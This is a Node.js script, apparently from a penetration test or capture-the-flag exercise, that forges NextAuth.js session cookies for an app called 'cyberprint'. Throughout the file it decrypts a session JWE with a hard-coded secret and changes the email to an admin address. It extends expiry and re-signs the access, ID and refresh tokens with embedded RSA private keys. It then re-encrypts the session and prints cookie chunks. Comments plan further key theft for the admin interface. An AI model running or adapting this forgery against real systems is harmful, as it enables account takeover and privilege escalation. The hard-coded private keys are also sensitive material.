const fs = require("fs")
const jose = require("jose")
const crypto = require("crypto")
const jwt = require("jsonwebtoken")

const info = "NextAuth.js Generated Encryption Key";
const nextAuthSecret = "cdc"
// Read the JWE from the file "jwe.txt"
const jwe = fs.readFileSync("jwe.txt", "utf8");

const cyberprint_rs256_private_key = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAiLy5kHwMLJuMoC39Ozr+yrs/fdLq1tgYu8GCkGlxFdx/1FrvluKZfASmiFG3ECTe/0Rx9tUy4dZJzT4yCETIhCvIY9N9bKw4iAxbCwlADpM5lfef5+v5+JzguEabTV4tPTydJIqe2qZ2/0oGa4CTOeVnDEzonLP/W/YzEtFuoLiswEh9ixX56Ck2s7AG2YVF9LmeTfdjLQcVwXJFeGtKCuViE1DyqmrHWmG5r7CHvCmuTq2YsEyVt0CRuaiPeYi5xj0i0BI5XOBCdIE84w+FFhq7tq/J4fJLu9w0MZniBXsFE698tUmdCu3Gg8QmiVcdYwAGc+yKsgU+lBWkdnZYmQIDAQABAoIBAAEds52gYMPcClp9iM1H23y36SCm4CZo9OnsMYHqCM0m+hId731GemTSCUvs751EBJMfy2OHQb2PIq+rdZWuStatU5rg+h6XcnSsNfGenZu6chdgjuxB94EJQsCuSHLQTt03llUnuBX/xgV3MYGe6iGB8LffrtK/zPJ15w/QKGKxn1IFVbP5kO2j4Edwca2kwgQ5gQo/uAFw3SmD3BRN9Fug8RFsgZqgRFcrK4Y9eXGeFS35m1PLTrkq/Ry1293r+hFMqm+0La/jBr+7V5jhb50BqF8Rs/TCUPx0p8KdXXbh+hgYchkyx1Ba2xSVgYYixvAqggUMa1eMl5FzVcmrhBsCgYEAv/XczeyWvwlCih9zrN3YR68wFGcILk22TvSI08pFxsBMjEXdGVe3kQlIbK+GSMtHkl+gcwwp/R5KEVecgmd6MP3M0F3DNDN4WnWxuadDoJc7B82pYhc4Fh3XHP1JVjUyxAx40wQ4uxtprGGQRFbRstEiK0czVRCJ0I/6b+bvLPcCgYEAtlqYO1DugGhNqI0weVZBnabfm1htxMHNBKUVGDNGdUbQ+c8wERBVO3f0pNFb7n4/SvOzRBRNCfz7uksWo4y/VQKq7sUZLsSnyAuX4tiFKMVJ9hZDs4YP864tMHDL/E7mAn03PXXf9uHLfc5Dh6CY6FLckh0/B2nmrKTEzP2OEu8CgYACcVyH+lTIxZNlMpVEQ+Z2sxIHkHAYNsD1LEN5fn940gWnW1Q++FDLtbSIPYuV7ZBRmonuLN9z6yjCI71II4z4hqJOnILZbTZA4HKMjEZeCs6jgMiBCQ6bqXGNWuPOBwtIV2hKNymJqAWmPe+aDwjIH8Uxi8xpbrZyQwLK3cN5bQKBgQCcDGznnbtr0VZbne9UdncSRWJnGsZcsQgUKH0jx4VNCPv+OspEX/jAOkf1319PeWQKbQAEi2bd3EtCwc0uylxVkEHcsHh7aDi4XQtuSaGyIRrI54aqE1iFTJFJOc2mLZJxoNvr0XqGV/V+xEtPviP79CTjOPneC0cmiJ4NWhIBqwKBgGmy+k/aR2S7LmoIEtI7zFio4HTaGa4UAhtAe+oZbiNWU4mNjfU8dEktsGPRKeNizXfbizh8vTZpOOb2WevpfaJMRMTIe9yAUk7KbGZGPE5pYqJyrcSmoAE7cfDo+oc1/f2SGjhGbuwaiJAo6l2/wedrhuaRvbBA+t1Z35V9o5AI\n-----END RSA PRIVATE KEY-----";
const cyberprint_rs256_kid = "6aRH5vtFkPzjLk41cvjbF3Kd-qQgPCoR91OpZNT7vAg";

const cyberprint_aes_kid = '697e7a76-0910-4fba-884c-b43fce0e2edf';
const cyberprint_hs512_kid = '48fb4c83-8e06-44ef-88d9-98e5390ae186';
const cyberprint_rsa_oaep_kid = 'IKo3alehIUC8rRbTHFcEr3Gons0AW0P--x7vBLyeROE';

const master_rs256_private_key = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEArb96qpQrzALKk4MuFbOQDJ+9nxrOlFxbHIyWuf2xT5ng2Pwe2WXDI6MremB/rpZ2n78567DIK8VGBUaWrBdxccnXNkGfwaapf8DgwDfYuEn7frnSx4ZGP1IXa1lpYY/oFTIHjkMrfiWKx+k+vgOevqpMuNSOTGDXLuh3O0x8GM465beRABCuigjhWT7sp1+jDbU+1EoaJZLrjLFhw3jePffs646/A40FA0+WFEVh4L9nQh+SdVAp9VhLJkAQJreYm+/IXGNc7A7lMY+dNUHGnVOaXoBSMPX9Ghqszus1x+hYmFggvYd4dPJAzLxJTWcoybQo4OSK084jlp/A7dCO5QIDAQABAoIBAEqIw8R9P7SK1gAl3BUvLHJd7GhehZQbcnJy1Q4AiJnPNyeeMFWuU+Hr03DyCJQKs+SfkedLtPMh84G74FL+04muvoXl7PST3E6TnVaYHn4gLqUUbhltvqDXRHimqJBTvYmqJpeetP+udzR/GI1G3EiKodMAS/Lz8BuNWei0TOAOkyKX9fII8MCLCCMkTIa6xzm4xR/7DBszzOdt1Mg0SMB66AWoR2QrQHIDNT9ysa1i5e/4juEkIzZ4GpuAby/vzPhFw2bdV1/0hNc06OkEKx4DgW1Y87oauIotWXG2nxAFf6YJjoolJhp8rPX9BgxNZSEY/tz8xRlY3wDdZ2DrN5kCgYEA2mq/nDqOwUzmyIOaEYpWNxd9t5dX89nyPBysEw7ORSoDHtDKGv+2SyfZCN5avHG+4IZ2hADy4fCWfCsypC88QgwB+j4ZcAuebOMbwAzs8AGiwFako70zw7OJCZgX31H+RBC28Ew4CiFgjh3Eaz4JytZ5SyM4ZuPjkg3QeiC15QMCgYEAy6UQUXyUkXULb4UgbKahq7vwn3iIVu+tpqX+PUuOx7qhs34JYTqmVRAdqu0I0ALylRgUXpaTHIrDlVzkyRQ/P/qtr2hr2ezFADQjn2cddKop0Wiq2LGCkaVPCpLGb9d3+DJjdwiKvmfw1xm+J5YUq+10q4giPdnmFdNdNx47M/cCgYEAqWcOAg/w1L/eZzqa7mvK/qO7n/9D+h/aHwFl/MoI9d/l16q8dkBKlPPtA1HiMjJOhzoDBdLujorZTKj8eBcit1800XAErsB0OaPTzBq6UlQSdPc+bri6Q1kmOki6izy+5u/H04xqEoFcsB0qULsnQSkjnkFM55Bs2sTYI0Dnkx0CgYA7YYhemnsf5wdMn38S74vY7dZ+ScFHyF/UZja6XNvndY5NLoVBqr5xs19TRgb50MI3o2vdIP8IpZXeadX0pEjFOS2IJmS8iQPwyUNR6dl2+V90Rpb61NgD7DYeGSpv1l6PKvJB9WWvm9NohYMjO+oPMBCDLBEABBfJaXaW6ePNhQKBgBJ3K/G9qrwLb94I1iy6vta2N7b2sDPaoQIy9bbjINWlChImhmxqMfNzBdZFFfFX3ZSyR1dCFkOCjTltCj2pJYj9xtBa/4VvDctVOThCkPCrZij8IcIqko6CXSMvV5qoguNxoCKJF8iJtIZlb2tw53OcKFu7t64Bq1ME1AShrmjk\n-----END RSA PRIVATE KEY-----";

// TODO: Grab the HS256 keys to sign the requests to the admin interface itself

const master_admin_id = 'ab707347-5b59-47b6-ba0c-40c1f9464ea7';
const cyberprint_admin_id = 'ce463944-e57e-4954-a0ba-902f5103b671';


// If you have DB access, can pull the keys from the DB
// https://stackoverflow.com/questions/72325253/how-to-retrieve-the-private-keys-from-keycloack-realms-keys

(async () => {
    // decrypt
    const key = await new Promise((res) => {
        crypto.hkdf("sha256", nextAuthSecret, "", info, 32, (_, key) => res(new Uint8Array(key)));
    });
    const { plaintext } = await jose.compactDecrypt(jwe, key);

    // Take the plaintext and decode as json
    const json = JSON.parse(plaintext.toString("utf8"));
    console.log("decrypted JWE")
    console.log(json);

    // ------------------------------
    // Modify the next auth JWE here
    // ------------------------------
    // Change the email string
    json.email = "admin@cyberprint.com";
    json.exp = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // 30 days
    json.expiresAt = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // 30 days

    // The accessToken is a jwt token, so load that
    const accessToken = json.accessToken;
    const decodedAccessToken = jwt.decode(accessToken);
    console.log("decodedAccessToken");
    console.log(decodedAccessToken);

    // ------------------------------
    // Modify the accessToken here
    // ------------------------------
    // Change the email string
    decodedAccessToken.email = "admin@cyberprint.com"
    // Update the expiry time
    decodedAccessToken.exp = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // 30 days

    // Encode the jwt token and update it in the json
    const newAccessToken = jwt.sign(decodedAccessToken, cyberprint_rs256_private_key, { algorithm: "RS256" , header: { kid: cyberprint_rs256_kid }});
    json.accessToken = newAccessToken;


    // The idToken is a jwt token, so load that
    const idToken = json.idToken;
    const decodedIdToken = jwt.decode(idToken);
    console.log("decodedIdToken");
    console.log(decodedIdToken);

    // ------------------------------
    // Modify the idToken here
    // ------------------------------
    // Update the expiry time
    decodedIdToken.exp = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // 30 days

    // Encode the jwt token and update it in the json
    const newIdToken = jwt.sign(decodedIdToken, cyberprint_rs256_private_key, { algorithm: "RS256", header: { kid: cyberprint_rs256_kid }});
    json.idToken = newIdToken;


    // The refreshToken is a jwt token, so load that
    const refreshToken = json.refreshToken;
    const decodedRefreshToken = jwt.decode(refreshToken);

    // ------------------------------
    // Modify the refreshToken here
    // ------------------------------
    // Update the expiry time
    decodedRefreshToken.exp = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // 30 days

    // Encode the jwt token and update it in the json
    const newRefreshToken = jwt.sign(decodedRefreshToken, cyberprint_rs256_private_key, { algorithm: "RS256", header: { kid: cyberprint_rs256_kid } });
    json.refreshToken = newRefreshToken;

    // Encode the json as a buffer
    const newPlaintext = Buffer.from(JSON.stringify(json), "utf8");


    // re-encrypt
    const encrypted = await new jose.CompactEncrypt(newPlaintext).setProtectedHeader({
        "alg": "dir",
        "enc": "A256GCM"
    }).encrypt(key);

    // Split the data into 4096 byte chunks for cookies
    const chunks = [];
    for (let i = 0; i < encrypted.length; i += 4096) {
        chunks.push(encrypted.slice(i, i + 4096));
    }

    // Log the chunks
    for(let i = 0; i < chunks.length; i++) {
        console.log(`next-auth.session-token.0.${i} : `)
        console.log(chunks[i]);
        console.log();
    }
})();


